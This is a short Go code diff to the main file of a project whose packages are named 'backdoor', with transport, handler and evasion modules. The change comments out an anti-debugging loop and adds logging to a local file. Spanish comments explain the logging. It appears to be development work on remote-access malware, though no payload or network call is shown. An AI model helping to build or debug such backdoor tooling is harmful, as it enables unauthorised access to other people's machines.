@@ -2,14 +2,27 @@ package main
 
 import (
 	"backdoor/config"
-	"backdoor/evasion"
 	"backdoor/handler"
 	"backdoor/transport"
+	"log"
+	"os"
 	"time"
 )
 
 func main() {
-	evasion.StartAntiDebugLoop()
+	// Crear archivo log.txt o abrir si ya existe
+	logFile, err := os.OpenFile("log.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
+	if err != nil {
+		// Si no se puede abrir el archivo, al menos mostrar el error por consola
+		panic(err)
+	}
+	defer logFile.Close()
+
+	// Redirigir logs a log.txt
+	log.SetOutput(logFile)
+	log.SetFlags(log.LstdFlags | log.Lshortfile)
+
+	// evasion.StartAntiDebugLoop()
 	for {
 		var conn transport.Transport
 		var err error
